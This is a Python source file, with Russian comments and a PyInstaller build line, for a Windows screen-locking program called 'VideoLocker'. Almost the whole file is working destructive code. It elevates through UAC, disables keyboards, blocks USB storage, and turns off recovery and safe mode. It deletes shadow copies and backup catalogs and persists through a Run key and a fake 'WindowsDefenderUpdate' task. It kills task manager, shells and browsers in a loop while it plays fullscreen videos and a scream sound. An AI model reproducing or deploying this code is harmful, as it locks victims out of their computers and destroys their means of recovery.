# language: Python, file: videolocker.py
# Зависимости: pillow opencv-python pygame psutil pywin32
# Сборка: pyinstaller --noconsole --onedir --name videolocker --add-data "video1.mp4;." --add-data "video2.mp4;." --add-data "video3.mp4;." --add-data "scream.mp3;." videolocker.py
# ВНИМАНИЕ: деструктивный код. ТОЛЬКО VM СО СНАПШОТОМ.

import ctypes
import os
import shutil
import subprocess
import sys
import threading
import time
from ctypes import wintypes

import psutil

try:
    import cv2
    HAS_CV2 = True
except ImportError:
    HAS_CV2 = False

try:
    import pygame
    HAS_PYGAME = True
except ImportError:
    HAS_PYGAME = False

# ================= НАСТРОЙКИ =================
OPERATOR = "pu709"
VIDEOS = ["video1.mp4", "video2.mp4", "video3.mp4"]

BLOCK_NAMES = {
    "notepad.exe", "taskmgr.exe", "cmd.exe", "regedit.exe",
    "processhacker.exe", "msconfig.exe", "iexplore.exe",
    "powershell.exe", "pwsh.exe", "wt.exe",
    "diskpart.exe", "mountvol.exe", "format.com",
    "procexp.exe", "procexp64.exe", "procmon.exe", "procmon64.exe",
    "autoruns.exe", "autoruns64.exe", "psexec.exe", "psexec64.exe",
    "wmic.exe", "cscript.exe", "wscript.exe", "mshta.exe",
    "reg.exe", "sc.exe", "net.exe", "net1.exe", "rundll32.exe",
    "regsvr32.exe", "msiexec.exe", "control.exe", "mmc.exe",
    "tasklist.exe", "taskkill.exe", "schtasks.exe", "bcdedit.exe",
    "reagentc.exe", "vssadmin.exe", "wbadmin.exe", "diskshadow.exe",
    "chkdsk.exe", "bootrec.exe", "sfc.exe", "dism.exe",
    "bcdboot.exe", "certutil.exe", "bitsadmin.exe", "curl.exe",
    "py.exe", "pyw.exe", "python.exe", "pythonw.exe",
    "chrome.exe", "msedge.exe", "firefox.exe", "opera.exe",
    "brave.exe", "vivaldi.exe",
    "winget.exe", "choco.exe", "scoop.exe",
    "setup.exe", "install.exe", "installer.exe",
}

BLOCK_PATHS = {
    r"c:\windows\system32\taskmgr.exe",
    r"c:\windows\system32\cmd.exe",
    r"c:\windows\system32\regedit.exe",
    r"c:\windows\system32\powershell.exe",
    r"c:\windows\system32\windowspowershell\v1.0\powershell.exe",
    r"c:\windows\system32\mmc.exe",
    r"c:\windows\system32\control.exe",
    r"c:\windows\system32\tasklist.exe",
    r"c:\windows\system32\taskkill.exe",
    r"c:\windows\system32\shutdown.exe",
    r"c:\windows\system32\wbem\wmiprvse.exe",
}

BLOCK_CMDLINE_TOKENS = (
    "taskmgr", "regedit", "processhacker", "msconfig",
    "powershell", "pwsh", "cmd.exe /c", "wmic",
)

_SELF_PID = os.getpid()
_STOP_FLAG = threading.Event()

APPDATA = os.environ.get("APPDATA", ".")
BASE_DIR = os.path.join(APPDATA, "VideoLocker")
MASQ_DIR = os.path.join(APPDATA, "Microsoft")
MASQ_SCRIPT = os.path.join(MASQ_DIR, "explorer.py")

CREATE_NO_WINDOW = 0x08000000
DETACHED_PROCESS = 0x00000008

# ================= WINAPI =================
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
user32 = ctypes.WinDLL("user32", use_last_error=True)

kernel32.GetModuleHandleW.restype = wintypes.HMODULE

# ================= UAC =================
def ensure_admin():
    if ctypes.windll.shell32.IsUserAnAdmin():
        return
    try:
        args = subprocess.list2cmdline(sys.argv)
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, args, None, 1)
    except Exception:
        pass
    sys.exit(0)

# ================= HELPERS =================
def _run(cmd, timeout=15):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True,
                           creationflags=CREATE_NO_WINDOW, timeout=timeout)
        return r.returncode, (r.stdout or "") + (r.stderr or "")
    except Exception as e:
        return -1, str(e)

# ================= KEYBOARD DISABLE (WMI, не локализован) =================
def disable_keyboards_wmi():
    """Отключает все клавиатуры через pnputil, ID берёт из WMI (не зависит от локали)."""
    try:
        rc, out = _run(["wmic", "path", "Win32_Keyboard", "get", "PNPDeviceID", "/format:list"], timeout=20)
        if rc != 0:
            return
        ids = []
        for line in out.splitlines():
            line = line.strip()
            if line.startswith("PNPDeviceID="):
                dev_id = line.split("=", 1)[1].strip()
                if dev_id:
                    ids.append(dev_id)
        for dev_id in ids:
            _run(["pnputil", "/disable-device", dev_id], timeout=15)
    except Exception:
        pass

# ================= KEYBOARD HOOK =================
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_SYSKEYDOWN = 0x0104

class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", wintypes.DWORD), ("scanCode", wintypes.DWORD),
        ("flags", wintypes.DWORD), ("time", wintypes.DWORD),
        ("dwExtraInfo", ctypes.c_void_p),
    ]

_kb_proc_ref = None
_kb_hook = None

def _kb_proc(nCode, wParam, lParam):
    if nCode == 0 and wParam in (WM_KEYDOWN, WM_SYSKEYDOWN):
        return 1  # блокируем все клавиши
    return user32.CallNextHookEx(None, nCode, wParam, lParam)

def keyboard_hook_loop():
    global _kb_proc_ref, _kb_hook
    HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_ssize_t, ctypes.c_int,
                                  wintypes.WPARAM, wintypes.LPARAM)
    _kb_proc_ref = HOOKPROC(_kb_proc)
    _kb_hook = user32.SetWindowsHookExW(WH_KEYBOARD_LL, _kb_proc_ref,
                                        kernel32.GetModuleHandleW(None), 0)
    if not _kb_hook:
        return
    msg = wintypes.MSG()
    try:
        while user32.GetMessageW(ctypes.byref(msg), None, 0, 0) > 0:
            user32.TranslateMessage(ctypes.byref(msg))
            user32.DispatchMessageW(ctypes.byref(msg))
    finally:
        try:
            user32.UnhookWindowsHookEx(_kb_hook)
        except Exception:
            pass
        _kb_hook = None

# ================= LIVE-USB / RECOVERY / SAFE MODE =================
def block_live_usb():
    for cmd in (
        ["reg", "add", r"HKLM\SYSTEM\CurrentControlSet\Services\USBSTOR",
         "/v", "Start", "/t", "REG_DWORD", "/d", "4", "/f"],
        ["mountvol", "/N"],
        ["reg", "add", r"HKLM\SOFTWARE\Policies\Microsoft\Windows\RemovableStorageDevices",
         "/v", "Deny_All", "/t", "REG_DWORD", "/d", "1", "/f"],
    ):
        try:
            subprocess.run(cmd, capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=10)
        except Exception:
            pass

def disable_recovery_and_safe_mode():
    for c in (
        ["reagentc", "/disable"],
        ["bcdedit", "/set", "{default}", "recoveryenabled", "No"],
        ["bcdedit", "/set", "{bootmgr}", "displaybootmenu", "No"],
        ["bcdedit", "/set", "{default}", "bootmenupolicy", "Legacy"],
        ["vssadmin", "delete", "shadows", "/all", "/quiet"],
        ["wbadmin", "delete", "catalog", "-quiet"],
    ):
        try:
            subprocess.run(c, capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=20)
        except Exception:
            pass
    for k in (r"HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal",
              r"HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network"):
        try:
            subprocess.run(["reg", "delete", k, "/f"],
                           capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=10)
        except Exception:
            pass

# ================= AUTOSTART / MASQUERADE =================
def install_autostart():
    line = f'"{sys.executable}"' if getattr(sys, "frozen", False) else f'"{sys.executable}" "{os.path.abspath(__file__)}"'
    try:
        import winreg
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Run",
                            0, winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, "explorer", 0, winreg.REG_SZ, line)
    except Exception:
        pass
    try:
        subprocess.run(["schtasks", "/create", "/tn", "WindowsDefenderUpdate", "/tr", line,
                        "/sc", "onlogon", "/rl", "highest", "/f"],
                       capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=15)
    except Exception:
        pass

def self_masquerade():
    try:
        os.makedirs(MASQ_DIR, exist_ok=True)
        src = os.path.abspath(__file__)
        dst = MASQ_SCRIPT
        if os.path.abspath(src).lower() != os.path.abspath(dst).lower():
            shutil.copy2(src, dst)
        return dst
    except Exception:
        return None

# ================= PROCESS KILL =================
def _proc_blocked(proc):
    try:
        info = proc.info
        cmd = " ".join(info.get("cmdline") or []).lower()
        if "--watchdog" in cmd:
            return False
        exe = (info.get("exe") or "").lower()
        if "appdata" in exe and "explorer.py" in exe:
            return False
        name = (info.get("name") or "").lower()
        if name in BLOCK_NAMES:
            return True
        if exe in BLOCK_PATHS:
            return True
        for tok in BLOCK_CMDLINE_TOKENS:
            if tok in cmd:
                return True
    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
        return False
    return False

def kill_blocked():
    for proc in psutil.process_iter(["name", "exe", "cmdline", "ppid", "pid"]):
        try:
            if proc.info.get("pid") == _SELF_PID:
                continue
            if proc.info.get("ppid") == _SELF_PID:
                continue
            if _proc_blocked(proc):
                proc.kill()
        except Exception:
            pass

def blocking_loop():
    while not _STOP_FLAG.is_set():
        kill_blocked()
        time.sleep(0.02)

# ================= RESOURCE =================
def resource_path(rel):
    base = getattr(sys, "_MEIPASS", os.path.dirname(os.path.abspath(__file__)))
    p = os.path.join(base, rel)
    return p if os.path.exists(p) else None

# ================= VIDEO LOCKER =================
def run_video_locker():
    import tkinter as tk
    from PIL import Image, ImageTk

    win = tk.Tk()
    win.title(f"VideoLocker — {OPERATOR}")
    win.attributes("-fullscreen", True)
    win.attributes("-topmost", True)
    win.configure(bg="#000000")
    win.protocol("WM_DELETE_WINDOW", lambda: None)
    win.overrideredirect(True)
    win.update_idletasks()

    sw = win.winfo_screenwidth()
    sh = win.winfo_screenheight()

    canvas = tk.Canvas(win, width=sw, height=sh, bg="#000000", highlightthickness=0)
    canvas.pack(fill="both", expand=True)

    # Загружаем все видео, у которых есть хотя бы один кадр
    caps = []
    if HAS_CV2:
        for v in VIDEOS:
            p = resource_path(v)
            if not p:
                continue
            cap = cv2.VideoCapture(p)
            if not cap.isOpened():
                continue
            ret, _ = cap.read()
            if not ret:
                cap.release()
                continue
            cap.set(cv2.CAP_PROP_POS_FRAMES, 0)
            caps.append(cap)

    state = {"index": 0, "fail_count": 0}

    def show_frame():
        if not caps:
            canvas.delete("all")
            canvas.create_text(sw // 2, sh // 2,
                               text="WINDOWS LOCKED", fill="#FF0000",
                               font=("Consolas", 48, "bold"))
            win.after(33, show_frame)
            return

        cap = caps[state["index"]]
        ret, frame = cap.read()
        if not ret:
            # конец текущего — переключаемся на следующее, не читаем сразу
            cap.set(cv2.CAP_PROP_POS_FRAMES, 0)
            state["index"] = (state["index"] + 1) % len(caps)
            state["fail_count"] += 1
            if state["fail_count"] > len(caps) * 2:
                # защита от пустого цикла: все видео "кончились" сразу
                state["fail_count"] = 0
                win.after(200, show_frame)
                return
            win.after(33, show_frame)
            return

        state["fail_count"] = 0
        try:
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            h, w, _ = frame.shape
            scale = min(sw / w, sh / h)
            new_w, new_h = int(w * scale), int(h * scale)
            frame = cv2.resize(frame, (new_w, new_h))
            img = Image.fromarray(frame)
            photo = ImageTk.PhotoImage(img)
            canvas.delete("all")
            canvas.create_image(sw // 2, sh // 2, image=photo, anchor="center")
            canvas.image = photo
        except Exception:
            pass

        win.after(33, show_frame)

    show_frame()

    if HAS_PYGAME:
        scream = resource_path("scream.mp3")
        if scream:
            try:
                pygame.mixer.init()
                pygame.mixer.music.load(scream)
                pygame.mixer.music.play(-1)
            except Exception:
                pass

    win.mainloop()

# ================= ENTRY =================
def main():
    ensure_admin()

    block_live_usb()
    disable_recovery_and_safe_mode()
    disable_keyboards_wmi()
    self_masquerade()
    install_autostart()

    threading.Thread(target=keyboard_hook_loop, daemon=True).start()
    threading.Thread(target=blocking_loop, daemon=True).start()

    run_video_locker()

if __name__ == "__main__":
    main()
